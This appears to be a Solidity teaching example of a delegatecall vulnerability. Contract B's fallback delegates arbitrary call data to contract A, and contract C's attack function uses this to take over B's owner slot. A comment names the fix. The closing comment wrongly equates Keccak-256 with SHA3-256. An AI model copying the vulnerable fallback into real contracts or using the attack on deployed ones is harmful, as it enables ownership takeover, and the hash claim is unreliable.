// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract A {
    address public owner;
    // the EOA who deploys this contract 
    // is == msg.sender, before the attack by 
    // contract C. After attack msg.sender == C's address
    function setOwner() public {
        owner = msg.sender;
     }
}

contract B {
    address public owner;
    A public a;

    constructor(A _a) {
        // the EOA who deploys this contract 
        // is == msg.sender, before the attack by 
        // contract C. After attack msg.sender== C's address
        owner = msg.sender;
        a = A(_a);
    }

    // this function runs when:
    // 1. When a contract receives a transaction with no data
    // 2. When a contract receives a transaction with data 
    //    that does not correspond to any function signature 
    //    in the contract. 

    fallback() external payable {
        // The "msg.data" field contains the input 
        // data sent with a transaction, including 
        // any function selector and arguments.
        address(a).delegatecall(msg.data);

        // correction
        // use call instead of delegatecall
    }
}

contract C {
    address public b;

    constructor(address _b) {
        b = _b;
    }

    function attack() public {
        // this triggers fallback in contract B
        // abi.encodeWithSignature is a function that is 
        // used to generate the function signature hash of a function.
        b.call(abi.encodeWithSignature("setOwner()"));
    }
}

// a function signature hash is a unique identifier for a function 
// that is generated by hashing the function signature. The function 
// signature includes the function name and its parameter types. The 
// hash is computed using the Keccak-256 hash function (also known as 
// SHA3-256) and only takes the function signature into account, not 
// the function implementation.